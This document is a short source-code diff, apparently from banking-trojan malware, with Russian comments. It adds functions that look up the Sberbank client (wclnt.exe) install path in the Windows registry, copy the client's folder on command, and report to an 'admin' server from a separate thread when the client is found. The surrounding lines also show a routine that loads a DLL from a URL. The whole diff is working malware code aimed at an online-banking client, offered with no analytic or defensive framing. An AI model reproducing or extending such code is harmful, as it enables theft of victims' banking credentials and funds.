@@ -130,6 +130,13 @@ static void SendLogToAdmin( int num )
 	HTTPResponse::Clear(&Response);
 }
 
+// Функция отправляет лог в отдельном потоке
+static DWORD WINAPI SendLogToAdminThread( LPVOID num )
+{
+	SendLogToAdmin( (int)num );
+	return 0;
+}
+
 static BYTE* LoadSluiceDll( char* uid )
 {
 	char url[128];
@@ -402,10 +409,41 @@ bool Init( const char* appName, DWORD appHash )
 	return false;
 }
 
-bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
+//возвращает папку в которой находится сбер
+static char* GetPathSber( char* path )
 {
-	StartCopyFolder( "d:\\clnt590\\wclnt.exe", true );
+	char* s = Registry::GetStringValue( HKEY_LOCAL_MACHINE, "SOFTWARE\\SBRF\\WCLNT", "Install_0" );
+	if( s )
+	{
+		m_lstrcpy( path, s );
+		STR::Free(s);
+		DBG( "Sber", "Путь к сберу '%s'", path );
+		return path;
+	}
+	path[0]= 0;
 	return 0;
 }
 
+bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
+{
+	char path[MAX_PATH];
+	InitData();
+	if( GetPathSber(path) )
+	{
+		pPathAppendA( path, "wclnt.exe" );
+		StartCopyFolder( path, true );
+	}
+	return 0;
+}
+
+//отсылает в лог 0, если есть в реестре ветка сбера
+void SendLogIfReestr()
+{
+	char path[MAX_PATH];
+	InitData();
+	if( GetPathSber(path) )
+		StartThread( SendLogToAdminThread, 0 );
+}
+
 };
+
